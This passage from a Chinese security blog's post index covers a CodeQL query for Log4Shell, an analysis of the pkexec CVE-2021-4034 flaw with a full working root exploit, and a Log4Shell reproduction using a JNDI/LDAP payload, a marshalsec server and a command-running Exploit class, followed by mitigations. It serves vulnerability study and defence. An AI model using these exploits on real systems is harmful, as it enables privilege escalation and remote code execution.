Agent型内存马》尚未发布，先留个坑在这里","link":"/%E6%8A%80%E6%9C%AF%E5%BD%92%E7%BA%B3/JavaWeb-%E5%86%85%E5%AD%98%E9%A9%AC%E6%8A%80%E6%9C%AF%E5%BD%92%E7%BA%B3/"},{"title":"使用CodeQL发现CVE-2021-44228","text":"虽然已经有了一个针对”Potential Log4J LDAP JNDI injection (CVE-2021-44228)”的实验性CWE-020 Query，但这次我想改写CWE-074，使其能够发现CVE-2021-44228。 本文同时提供其他语言的版本: English. 引入众所周知，Log4j是由受用户控制的JNDI查找引起的。从文档中，我发现CodeQL Query帮助已经涵盖了它，它的CWE编号是CWE-074。以下是该文档链接: JNDI lookup with user-controlled name 让我们一起学习这个CWE，尝试使用它来查找Log4j CVE-2021-44228漏洞 在本文中，有一些CodeQL专有的术语，我不会将它们转换为中文，但在这里解释一下它们的含义。你也可以在官方的术语库中查阅 predicate - 类似普通开发语言的函数 source - 类似于起点 sink - 类似于终点 query - 类似SQL的query，也类似脚本语言中的脚本 解读 CWE-074CWE-074代码: https://github.com/github/codeql/blob/main/java/ql/src/Security/CWE/CWE-074/JndiInjection.ql 正如我们所看到的，它将大部分代码封装到了semmle.code.java.security.JndiInjectionQuery中 通过代码中的注释，我们可以知道这个库被用来提供污点跟踪配置，以用于JNDI注入的Query。 在其中，我们可以发现它需要以下4个库： semmle.code.java.dataflow.FlowSources 提供了表示污点跟踪各种数据来源的类和predicate 这是CodeQL的基本库 semmle.code.java.frameworks.Jndi 提供了用于操作Java JNDI API的类和predicate。 semmle.code.java.frameworks.SpringLdap 提供了用于操作Spring LDAP API的类和predicate semmle.code.java.security.JndiInjection 提供了用于分析JNDI注入漏洞的类和predicate 这个对我们很重要，因此我们将分析这个库 解读 JndiInjection.qllClass DefaultJndiInjectionSink它调用了内部实验性API，在实践中，我发现它可以定位JNDI lookup函数。 以下是我编写的代码，其作用与sinkNode的调用相同。 123456exists(MethodAccess ma, Method m | ma.getMethod() = m and this.asExpr() = ma.getAnArgument() and m.getDeclaringType().hasQualifiedName(&quot;javax.naming&quot;,&quot;Context&quot;) and m.hasName(&quot;lookup&quot;)) Class ConditionedJndiInjectionSink该类扩展了JndiInjectionSink和DataFlow::ExprNode，因此它既是一个Node，也是一个ExprNode。 以下是CodeQL判断代码： 1234567891011exists(MethodAccess ma, Method m | ma.getMethod() = m and ma.getArgument(0) = this.asExpr() and m.getDeclaringType().getASourceSupertype*() instanceof TypeLdapOperations | m.hasName(&quot;search&quot;) and ma.getArgument(3).(CompileTimeConstantExpr).getBooleanValue() = true or m.hasName(&quot;unbind&quot;) and ma.getArgument(1).(CompileTimeConstantExpr).getBooleanValue() = true ) Let’s divide it into 3 parts by the | operand . 我们通过|运算符将其分为3个部分 1MethodAccess ma, Method m 首先是一个方法访问和方法 123ma.getMethod() = m andma.getArgument(0) = this.asExpr() andm.getDeclaringType().getASourceSupertype*() instanceof TypeLdapOperations 该方法访问了m方法，作为表达式的sink是m方法的第一个参数，而这个方法是LDAP操作。 12345m.hasName(&quot;search&quot;) andma.getArgument(3).(CompileTimeConstantExpr).getBooleanValue() = trueorm.hasName(&quot;unbind&quot;) andma.getArgument(1).(CompileTimeConstantExpr).getBooleanValue() = true 该方法可以是search方法，在编译时它的第三个参数应该是true；或者该方法可以是unbind方法，在编译时它的第一个参数应该是true。 这是什么意思？我们可以在真实的代码中查看一下。 TypeLdapOperations 包含2个类 org.springframework.ldap.core org.springframework.ldap 所以这只是针对具有SpringFramework的情况，但是这一次，我想找到一个更通用的条件，而不需要任何框架。不过，下次分析这一点也是一个不错的想法。 Class ProviderUrlJndiInjectionSink正如注释所说，它可以找到关于PROVIDER_URL的sink。 1234/** * Tainted value passed to env `Hashtable` as the provider URL by calling * `env.put(Context.PROVIDER_URL, tainted)` or `env.setProperty(Context.PROVIDER_URL, tainted)`. */ 12345678910111213141516exists(MethodAccess ma, Method m | ma.getMethod() = m and ma.getArgument(1) = this.getExpr()| m.getDeclaringType().getASourceSupertype*() instanceof TypeHashtable and (m.hasName(&quot;put&quot;) or m.hasName(&quot;setProperty&quot;)) and ( ma.getArgument(0).(CompileTimeConstantExpr).getStringValue() = &quot;java.naming.provider.url&quot; or exists(Field f | ma.getArgument(0) = f.getAnAccess() and f.hasName(&quot;PROVIDER_URL&quot;) and f.getDeclaringType() instanceof TypeNamingContext ) )) m.getDeclaringType().getASourceSupertype*() instanceof TypeHashtable 表示m 应该是 java.util.Hashtable的子类 (m.hasName(&quot;put&quot;) or m.hasName(&quot;setProperty&quot;)) 指定了方法的名称 最后一部分指示第一个参数应该是一个字符串java.naming.provider.url或者是一个类型为javax.naming.Context的字段，且名称应为PROVIDER_URL 123456789( ma.getArgument(0).(CompileTimeConstantExpr).getStringValue() = &quot;java.naming.provider.url&quot; or exists(Field f | ma.getArgument(0) = f.getAnAccess() and f.hasName(&quot;PROVIDER_URL&quot;) and f.getDeclaringType() instanceof TypeNamingContext )) 因此，显然，如果用户输入只能控制PROVIDER_URL，则此Query仍然可以找到它。 Class DefaultJndiInjectionAdditionalTaintStep 这是一组在跟踪JNDI注入相关数据流的污点时需要考虑的额外污点步骤，以避免在调用第三方包时出现污点跟踪中断。 nameStep(node1, node2) 表示 n1 到 n2 是一个数据流步骤，通过调用 new CompositeName(tainted) 或 new CompoundName(tainted) 在 String 和 CompositeName 或 CompoundName 之间进行转换。 nameAddStep(node1, node2) 表示 n1 到 n2 是一个数据流步骤，通过调用 new CompositeName().add(tainted) 或 new CompoundName().add(tainted) 在 String 和 CompositeName 或 CompoundName 之间进行转换。 jmxServiceUrlStep(node1, node2) 表示 n1 到 n2 是一个数据流步骤，通过调用 new JMXServiceURL(tainted) 在 String 和 JMXServiceURL 之间进行转换。 jmxConnectorStep(node1, node2) 表示 n1 到 n2 是一个数据流步骤，通过调用 JMXConnectorFactory.newJMXConnector(tainted) 在 JMXServiceURL 和 JMXConnector 之间进行转换。 rmiConnectorStep(node1, node2) 表示 n1 到 n2 是一个数据流步骤，通过调用 new RMIConnector(tainted) 在 JMXServiceURL 和 RMIConnector 之间进行转换。 解读JndiInjectionQuery.qll现在，让我们进入“query”库，这里包含了一些关于如何进行全局污点追踪的信息 Class JndiInjectionFlowConfig123456789101112131415class JndiInjectionFlowConfig extends TaintTracking::Configuration { JndiInjectionFlowConfig() { this = &quot;JndiInjectionFlowConfig&quot; } override predicate isSource(DataFlow::Node source) { source instanceof RemoteFlowSource } override predicate isSink(DataFlow::Node sink) { sink instanceof JndiInjectionSink } override predicate isSanitizer(DataFlow::Node node) { node.getType() instanceof PrimitiveType or node.getType() instanceof BoxedType } override predicate isAdditionalTaintStep(DataFlow::Node node1, DataFlow::Node node2) { any(JndiInjectionAdditionalTaintStep c).step(node1, node2) }} 它将 JndiInjectionSink 应用为 Sink 进行跟踪。 isSanitizer 定义了应该删除结果的条件，在这种情况下，如果节点是原始类型或包装原始类型（BoxedType），则会将其删除。 isAdditionalTaintStep 添加了额外的污点步骤，在这种情况下，它使用 JndiInjectionAdditionalTaintStep，使用这个库时，any 过滤器表示我们将使用任何可用的子类，在这里我们将使用已经解释过的 DefaultJndiInjectionAdditionalTaintStep 类。 Class UnsafeSearchControlsSink 一个当接收到一个 setReturningObjFlag 属性为 true 的 SearchControls 参数时执行 JNDI 查找的方法。 这个类定义了不安全的 Search Controls Sink。 12345exists(UnsafeSearchControlsConf conf, MethodAccess ma | conf.hasFlowTo(DataFlow::exprNode(ma.getAnArgument()))| this.asExpr() = ma.getArgument(0)) 正如我们所看到的，它需要 UnsafeSearchControlsConf，它定义了数据流的Source和 Sink，Source应该是 UnsafeSearchControls，Sink 应该是 UnsafeSearchControlsArgument。 UnsafeSearchControls：一个带有 setReturningObjFlag = true 的 SearchControls 对象。 https://docs.oracle.com/javase/8/docs/api/javax/naming/directory/SearchControls.html setReturningObjFlag 启用/禁用作为结果的一部分返回的对象。 UnsafeSearchControlsArgument：一个 LdapOperations.search 或 DirContext.search 调用的类型为 SearchControls 的参数。 因此，Sink 应该是方法访问的第一个参数，方法访问的一个参数将按照 UnsafeSearchControlsConf 中定义的规则进行污染。 使用Java代码测试JndiInjection.qlJndiInjection.ql 只是简单地使用 JndiInjectionFlowConfig 调用了路径的Query。 这是测试代码，其中部分代码从官方演示中提取。 123456789101112131415161718192021222324public void doGet(HttpServletRequest request, HttpServletResponse response) { System.setProperty(&quot;com.sun.jndi.rmi.object.trustURLCodebase&quot;,&quot;true&quot;); // necessary for Java 8 String name = request.getParameter(&quot;name&quot;); Hashtable&lt;String, String&gt; env = new Hashtable&lt;String, String&gt;(); env.put(Context.INITIAL_CONTEXT_FACTORY, &quot;com.sun.jndi.rmi.registry.RegistryContextFactory&quot;); env.put(Context.PROVIDER_URL, &quot;rmi://127.0.0.1:1099&quot;); // 匹配 ProviderUrlJndiInjectionSink InitialContext ctx = null; try { ctx = new InitialContext(env); // BAD: User input used in lookup ctx.lookup(name); // GOOD: The name is validated before being used in lookup// if (isValid(name)) {// ctx.lookup(name);// } else {// // Reject the request// } } catch (NamingException e) { throw new RuntimeException(e); }} 1java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer http://127.0.0.1:4444/\\#Exploit 1099 12jdk8codeql database create cwe074-test --language=java --source-root=/Users/kano/Workspace/IdeaProjects/demo12 我们得到了预期的结果. 我们可以使用 Quick evaluation 功能来验证之前的分析 DefaultJndiInjectionSink 找到了String name = request.getParameter(&quot;name&quot;); ProviderUrlJndiInjectionSink 找到了env.put(Context.PROVIDER_URL, &quot;rmi://127.0.0.1:1099&quot;); 事实证明这些Query工作得非常好 前进到 Log4j CVE-2021-44228引入org.apache.logging.log4j-2.14.1，你可以在这里找到它 here 为CodeQL准备数据库配置toolchains-sample-*.xml后，我们可以得到CodeQL数据库。 为了获得更好的性能，我们可以在“modules”部分排除无用的项目。 123456789101112131415161718192021222324252627282930313233343536&lt;modules&gt; &lt;module&gt;log4j-api-java9&lt;/module&gt; &lt;module&gt;log4j-api&lt;/module&gt; &lt;module&gt;log4j-core-java9&lt;/module&gt; &lt;module&gt;log4j-core&lt;/module&gt; &lt;!-- &lt;module&gt;log4j-layout-template-json&lt;/module&gt; &lt;module&gt;log4j-core-its&lt;/module&gt; &lt;module&gt;log4j-1.2-api&lt;/module&gt; &lt;module&gt;log4j-slf4j-impl&lt;/module&gt; &lt;module&gt;log4j-slf4j18-impl&lt;/module&gt; &lt;module&gt;log4j-to-slf4j&lt;/module&gt; &lt;module&gt;log4j-jcl&lt;/module&gt; &lt;module&gt;log4j-flume-ng&lt;/module&gt; &lt;module&gt;log4j-taglib&lt;/module&gt; &lt;module&gt;log4j-jmx-gui&lt;/module&gt; &lt;module&gt;log4j-samples&lt;/module&gt; &lt;module&gt;log4j-bom&lt;/module&gt; &lt;module&gt;log4j-jdbc-dbcp2&lt;/module&gt; &lt;module&gt;log4j-jpa&lt;/module&gt; &lt;module&gt;log4j-couchdb&lt;/module&gt; &lt;module&gt;log4j-mongodb3&lt;/module&gt; &lt;module&gt;log4j-mongodb4&lt;/module&gt; &lt;module&gt;log4j-cassandra&lt;/module&gt; &lt;module&gt;log4j-web&lt;/module&gt; &lt;module&gt;log4j-perf&lt;/module&gt; &lt;module&gt;log4j-iostreams&lt;/module&gt; &lt;module&gt;log4j-jul&lt;/module&gt; &lt;module&gt;log4j-jpl&lt;/module&gt; &lt;module&gt;log4j-liquibase&lt;/module&gt; &lt;module&gt;log4j-appserver&lt;/module&gt; &lt;module&gt;log4j-osgi&lt;/module&gt; &lt;module&gt;log4j-docker&lt;/module&gt; &lt;module&gt;log4j-kubernetes&lt;/module&gt; &lt;module&gt;log4j-spring-boot&lt;/module&gt; &lt;module&gt;log4j-spring-cloud-config&lt;/module&gt; --&gt; &lt;/modules&gt; 1codeql database create log4j-db -l java -s logging-log4j2-rel-2.14.1/ -c './mvnw clean install -t toolchains-sample-mac.xml -Dmaven.test.skip=true' 找到source通过调试，我们可以知道用户输入源位于log4j-api/src/main/java/org/apache/logging/log4j/spi/AbstractLogger.java中的各个日志函数，比如debug， info、error 和它们都将调用带有messag或messageSupplier作为日志消息的 logIfEnabled 函数。 所以源码应该是这样的： 123456789class Log4jFlowSource extends DataFlow::Node{ Log4jFlowSource(){ this.asParameter().getCallable().hasName(&quot;logIfEnabled&quot;) and ( this.asParameter().hasName(&quot;message&quot;) or this.asParameter().hasName(&quot;messageSupplier&quot;) ) }} 并且我需要添加一个新的 TaintTracking::Configuration 12345678910111213141516171819class JndiInjectionFlowConfigInLog4j extends TaintTracking::Configuration{ JndiInjectionFlowConfigInLog4j() { this = &quot;JndiInjectionFlowConfigInLog4j&quot; } override predicate isSource(DataFlow::Node source) { source instanceof Log4jFlowSource } override predicate isSink(DataFlow::Node sink) { sink instanceof JndiInjectionSink } override predicate isSanitizer(DataFlow::Node node) { node.getType() instanceof PrimitiveType or node.getType() instanceof BoxedType } override predicate isAdditionalTaintStep(DataFlow::Node node1, DataFlow::Node node2) { any(JndiInjectionAdditionalTaintStep c).step(node1, node2) }}from DataFlow::PathNode source, DataFlow::PathNode sink, JndiInjectionFlowConfigInLog4j confwhere conf.hasFlowPath(source, sink)select sink.getNode(), source, sink, &quot;JNDI lookup might include name from $@.&quot;, source.getNode(), &quot;this user input&quot; 只需要改变 isSource 部分其他部分与 JndiInjectionFlowConfig相同 运行Query，我们得到如下结果 运气不错，我们成功找到一条路径，证明用户输入可以传递给 JNDI 查找。 完整代码如下所示。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546/** * @name JNDI lookup with user-controlled name in Log4j Lib * @description Performing a JNDI lookup with a user-controlled name can lead to the download of an untrusted * object and to execution of arbitrary code. * @kind path-problem * @problem.severity error * @security-severity 9.8 * @precision high * @id java/jndi-injection * @tags security * external/cwe/cwe-074 */import javaimport semmle.code.java.security.JndiInjectionQueryimport DataFlow::PathGraphclass JndiInjectionFlowConfigInLog4j extends TaintTracking::Configuration{ JndiInjectionFlowConfigInLog4j() { this = &quot;JndiInjectionFlowConfigInLog4j&quot; } override predicate isSource(DataFlow::Node source) { source instanceof Log4jFlowSource } override predicate isSink(DataFlow::Node sink) { sink instanceof JndiInjectionSink } override predicate isSanitizer(DataFlow::Node node) { node.getType() instanceof PrimitiveType or node.getType() instanceof BoxedType } override predicate isAdditionalTaintStep(DataFlow::Node node1, DataFlow::Node node2) { any(JndiInjectionAdditionalTaintStep c).step(node1, node2) }}class Log4jFlowSource extends DataFlow::Node{ Log4jFlowSource(){ this.asParameter().getCallable().hasName(&quot;logIfEnabled&quot;) and ( this.asParameter().hasName(&quot;message&quot;) or this.asParameter().hasName(&quot;messageSupplier&quot;) ) }}from DataFlow::PathNode source, DataFlow::PathNode sink, JndiInjectionFlowConfigInLog4j confwhere conf.hasFlowPath(source, sink)select sink.getNode(), source, sink, &quot;JNDI lookup might include name from $@.&quot;, source.getNode(), &quot;this user input&quot; 参考CodeQL CWE Coverage: https://codeql.github.com/codeql-query-help/codeql-cwe-coverage/ CodeQL query help for Java: https://codeql.github.com/codeql-query-help/java/ CodeQL Repository: https://github.com/github/codeql/tree/main/java/ql/src/Security/CWE","link":"/%E6%8A%80%E6%9C%AF%E5%BD%92%E7%BA%B3/%E4%BD%BF%E7%94%A8CodeQL%E5%8F%91%E7%8E%B0CVE-2021-44228/"},{"title":"CVE-2021-4034 Linux Polkit 权限提升漏洞分析","text":"本文主要参考官方的Advisory来进行分析 本文同时提供以下语言的翻译： English. 漏洞简介2022-01-25，CVE-2021-4034 Exploit 详情发布，此漏洞是由Qualys研究团队在polkit的pkexec中发现的一个内存损坏漏洞 pkexec 应用程序是一个 setuid 工具，允许非特权用户根据预定义的策略以特权用户身份运行命令，基本上所有的主流Linux系统都安装了此工具，其自身也被设置了SUID权限位以正常运转 影响了自2009年5月第一个版本以来的所有pkexec版本，Commit 地址：Add a pkexec(1) command (c8c3d835) · Commits · polkit / polkit · GitLab 由于pkexec的广泛应用，此漏洞基本通杀目前所有Linux发行版，有效范围很大 漏洞原理分析选择一个修复前的版本进行分析，src/programs/pkexec.c · 0.120 · polkit / polkit · GitLab 根据披露，漏洞存在于pkexec的主函数，相对路径为/src/programs/pkexec.c 在534-568行，处理命令行参数 1234567891011121314151617181920212223242526272829303132333435for (n = 1; n &lt; (guint) argc; n++) // 注意这一句，如果我们传递了参数后，n应该在结束循环时与argc相等，如果没有参数，argc就为0，但是由于此处n的初始值为1，因此如果没有参数被传递，1就变成了argc(0)+1，如果后续继续使用n的话，就有可能出现问题{ if (strcmp (argv[n], &quot;--help&quot;) == 0) { opt_show_help = TRUE; } else if (strcmp (argv[n], &quot;--version&quot;) == 0) { opt_show_version = TRUE; } else if (strcmp (argv[n], &quot;--user&quot;) == 0 || strcmp (argv[n], &quot;-u&quot;) == 0) { n++; if (n &gt;= (guint) argc) { usage (argc, argv); goto out; } if (opt_user != NULL) { g_printerr (&quot;--user specified twice\\n&quot;); goto out; } opt_user = g_strdup (argv[n]); } else if (strcmp (argv[n], &quot;--disable-internal-agent&quot;) == 0) { opt_disable_internal_agent = TRUE; } else { break; }} 然后在610行，获取PROGRAM参数名称，也就是需要执行的程序 12345678910111213141516171819202122232425262728293031path = g_strdup (argv[n]); // 分析代码，我们可以发现n在此时被使用，g_strdup复制目标字符串，但是如果我们不传递任何参数，g_strdup用于拷贝字符串，如果没有参数传递，这里就产生内存越界读取了if (path == NULL){ GPtrArray *shell_argv; path = g_strdup (pwstruct.pw_shell); if (!path){ g_printerr (&quot;No shell configured or error retrieving pw_shell\\n&quot;); goto out;} /* If you change this, be sure to change the if (!command_line)case below too */ command_line = g_strdup (path); shell_argv = g_ptr_array_new (); g_ptr_array_add (shell_argv, path); g_ptr_array_add (shell_argv, NULL); exec_argv = (char**)g_ptr_array_free (shell_argv, FALSE);}if (path[0] != '/') // 如果路径不是绝对路径{ /* g_find_program_in_path() is not suspectible to attacks via the environment */ s = g_find_program_in_path (path); if (s == NULL) { g_printerr (&quot;Cannot run program %s: %s\\n&quot;, path, strerror (ENOENT)); goto out; } g_free (path); argv[n] = path = s; // 触发越界内存写入} 整理一下，得出，在不传递任何参数时，情况如下 在第 534 行，整数 n 的设置为 1 在第 610 行，从 argv[1] 越界读取指针路径 在第 639 行，指针 s 被越界写入 argv[1] 现在很重要的一点就是，我们想要知道，当越界的argv[1]包含了什么内容 当我们使用execve()执行一个程序时，内核会将我们的参数、环境字符串以及指针（argv 和 envp）复制到新程序栈的末尾；如下所示： 12345|---------+---------+-----+------------|---------+---------+-----+------------|| argv[0] | argv[1] | ... | argv[argc] | envp[0] | envp[1] | ... | envp[envc] ||----|----+----|----+-----+-----|------|----|----+----|----+-----+-----|------| V V V V V V &quot;program&quot; &quot;-option&quot; NULL &quot;value&quot; &quot;PATH=name&quot; NULL 也就是说，被越界访问的实际上是envp[0]，其指向第一个环境变量的值，再次总结，我们得到如下 在第610行，要执行的程序路径由envp[0]给出 在632行，path的值被传递给g_find_program_in_path() g_find_program_in_path()在PATH环境变量中搜索程序 如果找到可执行文件，完整的路径返回给pkexec的main()函数 在639行，完整路径被越界写入到argv[1]也就是envp[0]，这样就覆盖了我们的第一个环境变量 更准确地来说的话 如果环境变量被设置为PATH=name，如果目录name存在（如当前的工作目录）并且可执行文件被命名为value，那么name/value字符串的指针就会被越界写入到envp[0] 或者说，如果PATH是PATH=name=.，并且如果PATH=name=.存在且包含名为value的可执行文件，那么name=./value字符串的指针就会被越界写入到envp[0]中 由于字符串name=./value是我们最后会执行的命令，如果执行了name=./value，这个越界写入允许我们重新引入一个不安全的环境变量，这些被传递到SUID文件的不安全环境变量通常会在main()函数运行之前被删除(由ld.so完成)。接下来我们将基于这一点来进行exploit 要注意：polkit还支持非Linux系统如Solaris 和 BSD, 目前还没有深入分析过，但是OpenBSD是不可利用的，因为它的内核在argc为0时拒绝通过execve执行程序 我们的问题是如何通过重新引入不安全的环境变量来利用这个漏洞，在702行，pkexec完全清除了环境变量，因此可以利用的选项比较少 12345if (clearenv () != 0) { g_printerr (&quot;Error clearing environment: %s\\n&quot;, g_strerror (errno)); goto out; } 可以发现代码中多处调用了GLib的函数g_printerr()，如位于代码126行和408-409行的validate_environment_variable()函数log_message()调用了g_printerr() g_printerr()通常打印UTF-8错误消息，但如果环境变量CHARSET被设置后，其也可以使用其它字符集打印消息。为了将消息从CTF-8转换为其它字符集，g_printerr()调用了iconv_open() 为了进行字符集转换，iconv_open()执行一个共享库。通常来说来源字符集、目标字符集和共享库都通过默认配置文件/usr/lib/gconv/gconv-modules指定。但是环境变量GCONV_PATH可以强制iconv_open()使用另外一个配置文件，通常来说GCONV_PATH是一个不安全变量，会被移除，但是由于前面的漏洞，我们可以将其重新引入 要注意：这个利用技术会在日志中留下痕迹，如SHELL变量在/etc/shells中不存在，或者环境变量中存在可疑数据。然而，请注意，这个漏洞也可以以不留下痕迹的方式利用 构造 Exploit目前的主流Linux系统都受到此漏洞的影响，安装一个Ubuntu 20.04，运行pkexec --version可以发现版本是0.105 首先生成一个恶意的so文件，用来获取提权后的shell 1234567#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;void gconv() {}void gconv_init() { setuid(0); seteuid(0); setgid(0); setegid(0); system(&quot;PATH=/bin:/usr/bin:/sbin /bin/sh&quot;);} 1gcc -shared -fPIC payload.c -o payload.so 构造exploit LC_MESSAGES 用来指定要转换的字符集 XAUTHORITY 设置为非法值以跳过pkexec的正常执行，我们只需要触发日志函数来实现提权 1234567891011121314151617181920212223#include &lt;stdio.h&gt;#include &lt;unistd.h&gt;#include &lt;sys/stat.h&gt;int main() { char* _argv[]={ NULL }; char* _envp[]={ &quot;x&quot;, &quot;PATH=GCONV_PATH=.&quot;, &quot;LC_MESSAGES=en_US.UTF-8&quot;, &quot;XAUTHORITY=..&quot;, NULL }; mkdir(&quot;GCONV_PATH=.&quot;, 0777); mkdir(&quot;x&quot;, 0777); FILE *fp = fopen(&quot;x/gconv-modules&quot;, &quot;wb&quot;); fprintf(fp, &quot;module UTF-8// INTERNAL ../payload 2\\n&quot;); fclose(fp); fp = fopen(&quot;GCONV_PATH=./x&quot;, &quot;wb&quot;); fclose(fp); chmod(&quot;GCONV_PATH=./x&quot;,0777); execve(&quot;/usr/bin/pkexec&quot;, _argv, _envp);} 1gcc exploit.c -o exp.out 然后运行./exp.out直接成为root用户 漏洞修复参见：pkexec: local privilege escalation (CVE-2021-4034) (a2bf5c9c) · Commits · polkit / polkit · GitLab argc小于1直接退出程序","link":"/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/CVE-2021-4034-Linux-Polkit-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"},{"title":"CVE-2021-44228 log4j2 RCE 分析","text":"使用Java 8u181 本文同时提供以下语言的翻译： English. 漏洞简介Apache Log4j2是一个基于Java的日志记录工具。由于Apache Log4j2某些功能存在递归解析功能，攻击者可直接构造恶意请求，触发远程代码执行漏洞。漏洞利用无需特殊配置，经阿里云安全团队验证，Apache Struts2、Apache Solr、Apache Druid、Apache Flink等均受影响。 漏洞适用版本为2.0 &lt;= Apache log4j2 &lt;= 2.14.1，只需检测Java应用是否引入log4j-core这个jar。若存在应用使用，极大可能会受到影响。 Exploit 复现漏洞复现代码采用Maven构建Trigger项目 引入org.apache.logging.log4j 版本2.14.1包 触发代码，只要logger使用了可记录等级进行记录，就会触发漏洞 12345678import org.apache.logging.log4j.LogManager;import org.apache.logging.log4j.Logger;public class Main { private static final Logger logger = LogManager.getLogger(); public static void main(String[] args) { logger.error(&quot;${jndi:ldap://ip:1389/#Exploit}123&quot;); }} JNDI Payload 代码123456789101112131415161718192021222324252627282930313233343536import java.io.BufferedReader;import java.io.IOException;import java.io.InputStream;import java.io.InputStreamReader;import java.io.Reader;public class Exploit{ public Exploit() throws IOException,InterruptedException{ String cmd=&quot;curl 127.0.0.1:5555&quot;; final Process process = Runtime.getRuntime().exec(cmd); printMessage(process.getInputStream());; printMessage(process.getErrorStream()); int value=process.waitFor(); System.out.println(value); } private static void printMessage(final InputStream input) { new Thread (new Runnable() { @Override public void run() { // TODO Auto-generated method stub Reader reader =new InputStreamReader(input); BufferedReader bf = new BufferedReader(reader); String line = null; try { while ((line=bf.readLine())!=null) { System.out.println(line); } }catch (IOException e){ e.printStackTrace(); } } }).start(); }} 编译这段代码以便后续的JNDI调用使用，触发构造方法执行命令 漏洞触发典型的使用JNDI进行触发 首先在class文件处开启HTTP服务 然后利用marshalsec开启LDAP服务 1java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://127.0.0.1:8080/#Exploit 运行main函数，成功触发 漏洞原理分析代码利用链分析由于我们知道是JNDI注入，因此在javax.naming.InitialContext的构造方法处下断点 文件位于rt.jar/javax/naming/InitialContext.java 成功抓到断点 调用栈信息如下 我们知道要触发JNDI漏洞必须要通过lookup函数，从JndiLookup.lookup函数向上回溯 我们往Payload加入一些杂物，看看什么时候聚焦到payload ${jndi:ldap://127.0.0.1:1389/#Exploit} 可以发现substitute会将payload AAAAA${jndi:ldap://127.0.0.1:1389/#Exploit}BBBBB解引用变成JNDI URIldap://127.0.0.1:1389/#Exploit 除此之外，我们可以发现resolveVariable用于处理使用${}包裹的变量 再继续往上回溯，可以发现如下一段代码 可以发现只要遇到${则开始调用StrSubstuitutor的replace方法进行解析 漏洞深入分析log4j2的三大组件 Logger 日志记录器 Appender 日志输出 Layout 日志格式化 继续分析前面得到的调用栈，可以发现 在log4j2中通过LoggerConfig.processLogEvent()处理日志事件，主要部分在调用callAppenders()即调用Appender Appender功能主要是负责将日志事件传递到其目标，常用的Appender有ConsoleAppender（输出到控制台）、FileAppender（输出到本地文件）等，通过AppenderControl获取具体的Appender，本次调试的是ConsoleAppender。 Appender调用Layout获取日志格式，通过Layout.encode()进行日志的格式化 Layout会获取formatters来完成具体的格式化 处理传入的message通过MessagePatternConverter.format()，也是本次漏洞的关键之处。当config存在并且noLookups为false，匹配到${'则调用workingBuilder.append()获取StrSubstitutor内容来替换原来的信息。 可以发现此处有个noLookups，是一个配置值，默认为false，之后我们研究下如何利用它进行防御 再往前看，然后是StrSubstitutor.resolveVariable()进行解析，可以发现支持这些协议 其中就包含了JNDI 安全缓解措施 - 利用系统配置禁止LookUp noLookups通过交叉引用可以找到 这里先一种最简单的——直接代码增加配置 12345678910import org.apache.logging.log4j.LogManager;import org.apache.logging.log4j.Logger;import java.lang.*;public class Main { public static void main(String[] args) { System.setProperty(&quot;log4j2.formatMsgNoLookups&quot;,&quot;true&quot;); final Logger logger = LogManager.getLogger(); logger.error(&quot;AAAAA${jndi:ldap://127.0.0.1:1389/#Exploit}BBBBBB&quot;); }} 再次运行，可以发现不会对${jndi:ldap://127.0.0.1:1389/#Exploit}进行解析 除此之外，也可以通过properties文件或命令行进行配置 安全缓解措施 - 通过log4j2的配置文件禁止LookUp 我认为这是除了升级外最好的方法 参考官方文档：Log4j – Configuring Log4j 2 (apache.org) 除了XML还支持其它格式，以XML为例，在resource中创建log4j2.xml，一个能禁止LookUp的最小可用配置如下 12345678910111213&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;Configuration&gt; &lt;Appenders&gt; &lt;Console name=&quot;Console&quot; target=&quot;SYSTEM_OUT&quot;&gt; &lt;PatternLayout pattern=&quot;[%t] %-5level %m{nolookups} %n&quot;/&gt; &lt;/Console&gt; &lt;/Appenders&gt; &lt;Loggers&gt; &lt;Root level=&quot;info&quot;&gt; &lt;AppenderRef ref=&quot;Console&quot;/&gt; &lt;/Root&gt; &lt;/Loggers&gt;&lt;/Configuration&gt; 拓展思考 - log4j2为什么需要JNDI功能在Log4j – Configuring Log4j 2 - Apache Log4j 2找到Property Substitution（属性替换）功能，以通过本地之外的来源获取属性，使日志信息更加丰富 由于开发者没有考虑到JNDI的潜在危害，因此没有将其默认配置值设置为不加载也没有对JNDI来源地址进行限制 其它拓展常见的假阳性结果许多测试者通过DNS信息来判断是否发生了解析，以此来确定漏洞是否触发，这是不严谨的，许多公共服务都可能对这个地址进行DNS查询，用于垃圾拦截等功能，这不能代表其成功触发了漏洞 比较好的方式是在子域名中添加一个内嵌查询，如${sys:java.version} 防御方法 升级log4j core的最新版本 在配置文件中的Layout设置禁止LookUp 在系统配置中将设置formatMsgNoLookups为true，禁止LookUp 官方的修复方法 参考：https://logging.apache.org/log4j/2.x/changes-report.html 在2.15.0已默认禁用Message里的Lookups，并且默认限制了JNDI以及LDAP可以获取的类 除此之外，在2.16.0，默认禁用JNDI，需要使用log4j.enableJndi来启用 彻底移除在Message中的LookUps支持 log4j 2.15.0-RC1绕过Google了解到2.15.0-RC1这个候选发行版仍然存在可以被Bypass的可能性 编译log4j 2.15.0-RC1 由于RC版本现在在Maven仓库已经没有了，所有只能去GitHub手动获取源代码进行编译 Tags · apache/logging-log4j2 (github.com) 下载源代码后，根据README，先配置toolschains，调整jdk位置，由于只需要jdk1.8的包，只使用1.8的toolchain，其它注释掉 由于不需要编译所有包，在pom.xml中找到modules 将不需要的包注释，仅保留log4j-core和log4j-api 12345678910111213141516171819202122232425262728293031323334353637&lt;modules&gt; &lt;!-- &lt;module&gt;log4j-api-java9&lt;/module&gt; --&gt; &lt;module&gt;log4j-api&lt;/module&gt; &lt;!-- &lt;module&gt;log4j-core-java9&lt;/module&gt; --&gt; &lt;module&gt;log4j-core&lt;/module&gt; &lt;!-- &lt;module&gt;log4j-layout-template-json&lt;/module&gt; &lt;module&gt;log4j-core-its&lt;/module&gt; &lt;module&gt;log4j-1.2-api&lt;/module&gt; &lt;module&gt;log4j-slf4j-impl&lt;/module&gt; 